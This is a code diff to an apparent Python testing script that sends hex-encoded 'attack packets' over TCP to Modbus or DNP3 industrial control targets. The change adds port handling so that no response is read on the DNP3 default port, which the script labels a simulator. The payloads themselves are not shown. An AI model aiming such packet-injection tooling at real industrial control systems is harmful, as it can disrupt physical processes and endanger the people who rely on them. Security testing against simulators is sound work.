@@ -63,15 +63,18 @@ def debug(msg):
         print ("debug: %s" % msg)
 
 
-def send_pdu_packet(socket, send_list, attack_type = 0, tm = 10):
+def send_pdu_packet(socket, port, send_list, attack_type = 0, tm = 10):
     global  HOST,BUFSIZ,PORT
  
     print  ("Sending attack packet %s to target %s: %s"%(attack_type, HOST, send_list[(attack_type) -1]))
     socket.sendall(unhexlify(send_list[(attack_type) -1]))
 
-    #get response
-    resp = socket.recv(BUFSIZ)
-    print("Received attack Response from %s: %s" % (HOST, resp.encode('hex')))
+    #get response, if port is 20000 as DNP3 default port, do NOT get response, modbus expects response
+    if (port != "20000"):
+        resp = socket.recv(BUFSIZ)
+        print("Received attack Response from %s: %s" % (HOST, resp.encode('hex')))
+    elif (port == "20000"):
+        print("PORT: %s,  DNP3 simulator, no response is expected" % port)
 
     #time.sleep(tm)
     #str1 = raw_input('any key to continue> ')
@@ -136,7 +139,7 @@ def main(argv):
         print  ("Connect to target %s: %s error: %s" % (HOST, PORT, e))
  
     if ( COUNT == 1 ):
-        send_pdu_packet(tcpCliSock, tranx_list, attack)
+        send_pdu_packet(tcpCliSock, PORT, tranx_list, attack)
     elif ( COUNT <= 0 ):
         print  ("count %s invalid, should be >=1" % e)
         sys.exit(1)
@@ -146,7 +149,7 @@ def main(argv):
         while (cnt < COUNT):
             for idx in range (1, (len(tranx_list)) ):
                 print ("list idx: %s" % (idx -1))
-                send_pdu_packet(tcpCliSock, tranx_list, idx)
+                send_pdu_packet(tcpCliSock, PORT, tranx_list, idx)
                 cnt += 1
                 print ("iteration cnt: %s" % (cnt))
                 if (cnt >= COUNT):
